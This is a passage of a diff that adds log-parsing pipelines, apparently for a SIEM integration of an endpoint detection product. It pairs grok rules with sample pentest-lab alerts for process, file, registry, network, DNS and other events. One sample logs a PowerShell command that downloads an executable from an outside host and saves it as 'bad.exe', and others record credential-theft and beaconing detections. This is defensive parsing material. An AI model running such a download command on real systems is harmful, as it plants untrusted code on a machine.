+              Event Timestamp: 2022-06-23T12:54:15.811Z, Event Received
+              Timestamp: 2022-06-23T12:54:41Z, Device Last Reported Users:
+              (PENTEST\\Administrator), Zone Ids:
+              (39BFDA7FEF71490584AAB4F163142350), Detection Rule Id:
+              3f110342-88f8-11ec-a8a3-0242ac120002, Instigating Process Command
+              Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process
+              File Path: c:\\windows\\system32\\cmd.exe, Target Process Name:
+              powershell.exe, Target Process Owner: PENTEST//Administrator,
+              Target Process ImageFileSha256:
+              BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,
+              Device Id: 3514593e-7405-4319-8ca5-8ec876bf0195, Target Process
+              Command Line: powershell -command \"(new-object
+              SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/inf\
+              ection/psexec.exe', 'C:\\dver\\bad.exe')\", Target Process File
+              Path:
+              c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_process_rule Device Name: %{PARSE_TILL_COMMA2:device_name},
+              Zone Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA2:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Target Process
+              Name: %{PARSE_TILL_COMMA2:target_process_name}, Target Process
+              Owner: %{PARSE_TILL_COMMA2:target_process_owner}, Target Process
+              ImageFileSha256: (%{notSpace:target_process_imagefilesha256})?,
+              Device Id: (%{notSpace:device_id})?, Target Process Command Line:
+              %{PARSE_TILL_COMMA:target_process_command_line}, Target Process
+              File Path: (%{notSpace:target_process_file_path})?'
+    - type: pipeline
+      name: Processing Aurora Focus File Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeFileEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus File Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - 'Device Name: ADMIN, Zone Names: (Windows Zone (Default)), Event
+              Id: 3013d82e-6b4c-4677-a334-3fd4934fed7k, Severity: Informational,
+              Description: Win Browser CredTheft Mitre T1003, Instigating
+              Process Name: msedge.exe, Instigating Process Owner: admin//test,
+              Instigating Process ImageFileSha256:
+              2C853AA78C45045C540668AC2EE63407CEF02EE55BFAFD6F678EC9E84EC23CBA,
+              Event Timestamp: 2025-11-19T09:45:11.336Z, Event Received
+              Timestamp: 2025-11-19T09:45:17Z, Device Last Reported Users:
+              (admin\test1,admin\test,Window Manager\DWM-1,Window
+              Manager\DWM-2,Window Manager\DWM-3), Zone Ids:
+              (E79C47BC6292419DBD0AE117798FB350), Detection Rule Id:
+              26cadfe8-1b8c-489c-ae29-115b5bc9d592, Instigating Process Command
+              Line: "C:\Program Files
+              (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility
+              --utility-sub-type=chrome.mojom.ProfileImport --lang=en-US
+              --service-sandbox-type=none --skip-read-main-dll
+              --metrics-shmem-handle=5020,i,3478498035652716424,1717516754338192010,524288
+              --field-trial-handle=2372,i,11122849255781664600,8070874040734229388,262144
+              --variations-seed-version
+              --trace-process-track-uuid=3190708991934122588
+              --mojo-platform-channel-handle=5012 /prefetch:14, Instigating
+              Process File Path: c:\program files
+              (x86)\microsoft\edge\application\msedge.exe, Target File Path:
+              c:\users\test\appdata\local\google\chrome\user data\default\login
+              data for account, Target File Owner: admin//test, Target File
+              Sha256: E79C47BC6292419DBD0AE117798FB350, Device Id: 191c967b-264c-46c3-999b-94c071e2e798'
+            - 'Device Name: SECURITYSERVER3, Zone Names:
+              (JeffTesting,JeffSecurityServer), Event Id:
+              f4739af7-9c8b-4dc0-aeb7-2d4533445d49, Severity: Medium,
+              Description: SYSLOG detections - Looking for a created file
+              cylancetest.txt, Instigating Process Name: cmd.exe, Instigating
+              Process Owner: PENTEST//Administrator, Instigating Process
+              ImageFileSha256:
+              BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,
+              Event Timestamp: 2022-06-28T18:09:32.693Z, Event Received
+              Timestamp: 2022-06-28T18:09:36Z, Device Last Reported Users:
+              (PENTEST\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,F568A8A8E401470282C1FE98FDD1703A),
+              Detection Rule Id: 74bd0e7e-281a-4d7b-9f84-d0f51346782c,
+              Instigating Process Command Line: "C:\Windows\system32\cmd.exe" ,
+              Instigating Process File Path: c:\windows\system32\cmd.exe, Target
+              File Path:
+              c:\users\administrator.pentest\downloads\syslog_test_cae_rules\cylancetest.txt,
+              Target File Owner: BUILTIN//Administrators, Target File Sha256: E79C47BC6292419DBD0AE117798FB350,
+              Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954'
+            - 'Device Name: ADMIN, Zone Names: (Windows Zone (Default),test
+              Devices), Event Id: c259013f-7294-41c4-8d5a-426dfd117d68,
+              Severity: Informational, Description: Win Browser CredentialTheft
+              Mitre T1003, Instigating Process Name: chrome.exe, Instigating
+              Process Owner: admin//test, Instigating Process ImageFileSha256:
+              5186B823F4E174B13B9F60BB76ED89FE8FD44487B34B79DFE283275A13BD948B,
+              Event Timestamp: 2025-11-26T15:55:36.812Z, Event Received
+              Timestamp: 2025-11-26T15:55:54Z, Device Last Reported Users:
+              (admin\test,Window Manager\DWM-1,Window Manager\DWM-2), Zone Ids:
+              (E79C47BC6292419DBD0AE117798FB353,8F852781BD6E413285B0CD324F055674),
+              Detection Rule Id: d935a7df-2114-442f-a44a-728485ff1cc5,
+              Instigating Process Command Line: "C:\Program
+              Files\Google\Chrome\Application\chrome.exe" , Instigating Process
+              File Path: c:\program files\google\chrome\application\chrome.exe,
+              Target File Path: c:\users\test\appdata\local\google\chrome\user
+              data\default\preferences~rf24ba61f2.tmp, Target File Owner:
+              admin//test, Target File Sha256: E79C47BC6292419DBD0AE117798FB350, Device Id:
+              191c967b-264c-46c3-999b-94c071e2e790'
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_file_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Target File
+              Path: %{PARSE_TILL_COMMA2:target_file_path}, Target File Owner:
+              %{PARSE_TILL_COMMA2:target_file_owner}, Target File Sha256:
+              (%{notSpace:target_process_imagefilesha256})?(, Device Id:
+              %{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus Registry Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeRegistryEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus Registry Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: SECURITYSERVER3, Zone Names:
+              (JeffTesting,JeffSecurityServer), Event Id:
+              6d33d636-dcdc-48c2-911a-ead99ac17f88, Severity: Medium,
+              Description: SYSLOG detections - RegistryKey
+              \\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlex\
+              t, Instigating Process Name: ICreatePersistencePoints.exe,
+              Instigating Process Owner: PENTEST//Administrator, Instigating
+              Process ImageFileSha256:
+              F83926AB855E860C9B1A6D72EB6024D9E1D569A59E4901A62E8543B1C978D5E5,
+              Event Timestamp: 2022-06-28T18:08:49.103Z, Event Received
+              Timestamp: 2022-06-28T18:08:54Z, Device Last Reported Users:
+              (PENTEST\\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,161EB91D79D6466A80182CF685FA7CA\
+              A), Detection Rule Id: 74354415-7d28-4f31-830d-72a14c0c3d8b,
+              Instigating Process Command Line: ICreatePersistencePoints.exe
+              --trigger 0, Instigating Process File Path:
+              c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\
+              \\icreatepersistencepoints.exe, Target Registry KeyPath:
+              HKLM\\software\\classes\\*\\shellex\\contextmenuhandlers\\cywares\
+              hlext, Target Registry ValueName: default, Device Id:
+              c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_registry_rule Device Name: %{PARSE_TILL_COMMA2:device_name},
+              Zone Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id}), Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Target
+              Registry KeyPath: %{PARSE_TILL_COMMA2:target_registry_keypath},
+              Target Registry ValueName:
+              %{PARSE_TILL_COMMA2:target_registry_valuename}, Device Id:
+              (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus Network Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeNetworkEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus Network Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - 'Device Name: ADMIN, Zone Names: (Windows Zone (Default)), Event
+              Id: fbc31190-9974-48b9-956c-5e080bd6ad5f, Severity: Low,
+              Description: Unsigned Application Network Beaconing, Instigating
+              Process Name: FXAALZ.exe, Instigating Process Owner: admin//test,
+              Instigating Process ImageFileSha256:
+              F0AAAE0364306BB7A4681D01935C96C2AC76B3576B7982990F86BCAF811A45BS,
+              Event Timestamp: 2025-11-19T09:52:15.782Z, Event Received
+              Timestamp: 2025-11-19T09:52:22Z, Device Last Reported Users:
+              (admin\test1,admin\test,Window Manager\DWM-1,Window
+              Manager\DWM-2,Window Manager\DWM-3), Zone Ids:
+              (E79C47BC6292419DBD0AE117798FB359), Detection Rule Id:
+              6ab20572-8eb4-41a8-a8ea-d16766de0e44, Instigating Process Command
+              Line: "C:\CPZIVC\FXAALZ.exe" -f C:\CPZIVC\NGHVQE, Instigating
+              Process File Path: c:\cpzivc\fxaalz.exe, Destination IP:
+              142.202.51.62, Destination Port: 9002, Device Id:
+              191c967b-264c-46c3-999b-94c071e2e790, Source IP: 192.168.90.24,
+              Source Port: 61137'
+            - "Device Name: SECURITYSERVER3, Zone Names:
+              (JeffTesting,JeffSecurityServer), Event Id:
+              23a04c4c-1a97-4a58-b4bc-fadadb729e32, Severity: Medium,
+              Description: SYSLOG detections - Looking for NetworkConnection
+              8.8.8.8, Instigating Process Name: ICreateNetworkConnections.exe,
+              Instigating Process Owner: PENTEST//Administrator, Instigating
+              Process ImageFileSha256:
+              F816E73FFAD0CA8684B6E44292276DD9B9CB8890ABAA732A7AEB283B46D32003,
+              Event Timestamp: 2022-06-28T18:09:56.392Z, Event Received
+              Timestamp: 2022-06-28T18:10:00Z, Device Last Reported Users:
+              (PENTEST\\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,161EB91D79D6466A80182CF685FA7CA\
+              A), Detection Rule Id: fdac76c9-5c6b-4b6f-8062-e074457afe3e,
+              Instigating Process Command Line: ICreateNetworkConnections.exe
+              --sequential 8.8.8.8, Instigating Process File Path:
+              c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\
+              \\icreatenetworkconnections.exe, Destination IP: 8.8.8.81,
+              Destination Port: 29281, Device Id:
+              c7b79f9f-4fbe-4f90-9658-ec7e17af1954, Source IP: 192.168.254.102,
+              Source Port: 52912"
+            - 'Device Name: ADMIN, Zone Names: (Windows Zone (Default),test
+              Devices), Event Id: c202bf55-4a24-4f8a-9922-f4627db91f8f,
+              Severity: Low, Description: Unsigned Application Network
+              Beaconing, Instigating Process Name: FXAALZ.exe, Instigating
+              Process Owner: admin//test, Instigating Process ImageFileSha256:
+              F0AAAE0364306BB7A4681D01935C96C2AC76B3576B7982990F86BCAF811A45BC,
+              Event Timestamp: 2025-11-26T13:58:04.424Z, Event Received
+              Timestamp: 2025-11-26T13:58:21Z, Device Last Reported Users:
+              (admin\test,Window Manager\DWM-1,Window Manager\DWM-2), Zone Ids:
+              (E79C47BC6292419DBD0AE117798FB353,8F852781BD6E413285B0CD324F055676),
+              Detection Rule Id: 6ab20572-8eb4-41a8-a8ea-d16766de0e46,
+              Instigating Process Command Line: "C:\CPZIVC\FXAALZ.exe" -f
+              C:\CPZIVC\NGHVQE, Instigating Process File Path:
+              c:\cpzivc\fxaalz.exe, Destination IP: 45.9.156.109, Destination
+              Port: 8630, Device Id: 191c967b-264c-46c3-999b-94c071e2e793,
+              Source IP: 192.168.91.23, Source Port: 10008'
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_network_rule Device Name: %{PARSE_TILL_COMMA2:device_name},
+              Zone Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Destination
+              IP: (%{ip:network.destination.ip})?, Destination Port:
+              (%{port:network.destination.port})?, Device Id:
+              (%{notSpace:device_id})?, Source IP: (%{ip:network.client.ip})?,
+              Source Port: (%{port:network.client.port})?'
+        - type: geo-ip-parser
+          name: Extracting Geo Location from Client IP Address
+          enabled: true
+          sources:
+            - network.client.ip
+          target: network.client.geoip
+          ip_processing_behavior: do-nothing
+        - type: geo-ip-parser
+          name: Extracting Geo Location from Destination IP Address
+          enabled: true
+          sources:
+            - network.destination.ip
+          target: network.destination.geoip
+          ip_processing_behavior: do-nothing
+    - type: pipeline
+      name: Processing Aurora Focus Memory Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeMemoryEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus Memory Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,Jeff_3.0),
+              Event Id: c4e7d4e1-8739-4996-83a3-19d9ba583882, Severity: Medium,
+              Description: Looking for a protect memory event, Instigating
+              Process Name: AttackTest32.exe, Instigating Process Owner:
+              PENTEST/Administrator, Instigating Process ImageFileSha256:
+              2762CB5818C67BDD28DFE88FB528EF06B0C1AB5C175E2206B49C85BB8672C2EC,
+              Event Timestamp: 2022-07-21T12:55:02.277Z, Event Received
+              Timestamp: 2022-07-21T12:55:25Z, Device Last Reported Users:
+              PENTEST\\Administrator, Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,161EB91D79D6466A80182CF685FA7CA\
+              A), Detection Rule Id: edf530c6-6b0e-4be2-aeb6-d3f8001fce05,
+              Instigating Process Command Line: AttackTest32.exe -p:8000,
+              Instigating Process File Path:
+              c:\\users\\administrator.pentest\\downloads\\attacktest\\attackte\
+              st32.exe, Device Id: e378dacb-9324-453a-b8c6-5a8406952195"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_memory_rule Device Name: %{PARSE_TILL_COMMA2:device_name},
+              Zone Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Device Id:
+              (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus DNS Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeDnsEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus DNS Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: SECURITYSERVER, Zone Names:
+              (JeffTesting,JeffSecurityServer), Event Id:
+              6458f3ac-e527-4922-83ac-654518c3137e, Severity: Medium,
+              Description: Win_Suspicious_DNSLength_MitreT1071, Instigating
+              Process Name: lsass.exe, Instigating Process Owner: NT
+              AUTHORITY//SYSTEM, Instigating Process ImageFileSha256:
+              91EAB6178A9BB2B268E7438E54B128F939C0BDF5BD8AC8B15EFCAF0572AADC3F,
+              Event Timestamp: 2022-06-28T17:34:12.772Z, Event Received
+              Timestamp: 2022-06-28T17:34:33Z, Device Last Reported Users:
+              (PENTEST\\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,161EB91D79D6466A80182CF685FA7CA\
+              A), Detection Rule Id: 0da4f7c3-af0d-46be-8f6b-1884a1c67331,
+              Instigating Process Command Line:
+              C:\\Windows\\system32\\lsass.exe, Instigating Process File Path:
+              c:\\windows\\system32\\lsass.exe, Target Domain Name:
+              7f2a98df-486e-4cec-8d6e-c227073955e6._msdcs.Pentest.Local.,
+              Resolved Address: securityserver.Pentest.Local, Resolved Address
+              Count: 1, Device Id: 41666e82-50e6-4777-88b6-5f2b567027b9"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_dns_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Target Domain
+              Name: %{PARSE_TILL_COMMA2:dns.question.name}, Resolved Address:
+              %{PARSE_TILL_COMMA2:resolved_address}, Resolved Address Count:
+              (%{integer:resolved_address_count})?, Device Id:
+              (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus Log Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeLogEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus Log Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: SECURITYSERVER3, Zone Names:
+              (JeffTesting,JeffSecurityServer), Event Id:
+              ba8810a9-afac-4579-82a2-638f0f584d60, Severity: High, Description:
+              Win_CreateAccount_MitreT1136, Instigating Process Name: lsass.exe,
+              Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating
+              Process ImageFileSha256:
+              BBC83E4759D4B82BAD31E371AD679AA414C72273BF97CEE5AED8337ED8A4D79F,
+              Event Timestamp: 2022-06-28T18:17:05.001Z, Event Received
+              Timestamp: 2022-06-28T18:17:10Z, Device Last Reported Users:
+              (PENTEST\\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,161EB91D79D6466A80182CF685FA7CA\
+              A), Detection Rule Id: 266e750f-a838-4974-9afc-20cb863031cc,
+              Instigating Process Command Line:
+              C:\\Windows\\system32\\lsass.exe, Instigating Process File Path:
+              c:\\windows\\system32\\lsass.exe, Windows Event Id: 4720, Security
+              Provider: SecurityAuditProvider, Device Id:
+              c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_log_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Windows Event
+              Id: (%{notSpace:windows_event_id})?, Security Provider:
+              %{PARSE_TILL_COMMA2:security_provider}, Device Id:
+              (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus Powershell Trace Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaePowershellTraceEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus Powershell Trace Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - 'Device Name: SECURITYSERVER3, Zone Names:
+              (JeffTesting,JeffSecurityServer), Event Id:
+              4b199c5c-60dc-4b5c-8dac-86965ba5b051, Severity: Medium,
+              Description: SYSLOG detections - Looking for PowershellTrace
+              get-childitem, Instigating Process Name: powershell.exe,
+              Instigating Process Owner: PENTEST//Administrator, Instigating
+              Process ImageFileSha256:
+              DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,
+              Event Timestamp: 2022-06-28T18:10:39.547Z, Event Received
+              Timestamp: 2022-06-28T18:10:43Z, Device Last Reported Users:
+              (PENTEST\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,F568A8A8E401470282C1FE98FDD1703A),
+              Detection Rule Id: 9eb1073c-913f-49ab-9b12-2e5a28dad18d,
+              Instigating Process Command Line: powershell gwmi -class
+              win32_process, Instigating Process File Path:
+              c:\windows\system32\windowspowershell\v1.0\powershell.exe, Script
+              Block Text:
+              @{GUID="EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D"Author="Microsoft
+              Corporation"CompanyName="Micros, Script Block Length: 2583,
+              Payload: None, Payload Length: 0, Device Id:
+              c7b79f9f-4fbe-4f90-9658-ec7e17af1954'
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_powershell_trace_rule Device Name:
+              %{PARSE_TILL_COMMA2:device_name}, Zone Names:
+              %{PARSE_TILL_COMMA:zone_names}, Event Id: (%{notSpace:event_id})?,
+              Severity: (%{notSpace:severity})?, Description:
+              %{PARSE_TILL_COMMA2:description}, Instigating Process Name:
+              %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating Process
+              Owner: %{PARSE_TILL_COMMA2:instigating_process_owner}, Instigating
+              Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Script Block
+              Text: %{PARSE_TILL_COMMA2:script_block_text}, Script Block Length:
+              (%{integer:script_block_length})?, Payload:
+              %{PARSE_TILL_COMMA2:payload}, Payload Length:
+              (%{integer:payload_length})?, Device Id: (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus WMI Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeWmiEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus WMI Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: JEFWILLIAMS-1, Zone Names: (JeffTesting,Jeff_3.0),
+              Event Id: 9fa208e5-779d-40b1-b4e2-44c330600396, Severity: Medium,
+              Description: SYSLOG detections - Looking for WmiTrace select,
+              Instigating Process Name: WmiPrvSE.exe, Instigating Process Owner:
+              NT AUTHORITY//NETWORK SERVICE, Instigating Process
+              ImageFileSha256:
+              B5C78BEF3883E3099F7EF844DA1446DB29107E5C0223B97F29E7FAFAB5527F15,
+              Event Timestamp: 2022-06-28T18:09:55.613Z, Event Received
+              Timestamp: 2022-06-28T18:09:57Z, Device Last Reported Users:
+              (RIMNET\\jefwilliams), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,24362CB3F25D4EB59C03FD6E3800C20\
+              E), Detection Rule Id: f83b1ac8-b966-4297-be47-bb893bf23f2d,
+              Instigating Process Command Line:
+              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe-secured-Embedding,
+              Instigating Process File Path:
+              c:\\windows\\system32\\wbem\\wmiprvse.exe, Consumer Text: None,
+              Consumer Text Length: 0, Operation: Start
+              IWbemServices::CreateInstanceEnum - root\\Standardcimv2 :
+              MSFT_NetIPAddress, Operation Length: 80, Device Id:
+              c6246140-bba5-4c55-be02-77300bf91dbc"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_wmi_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
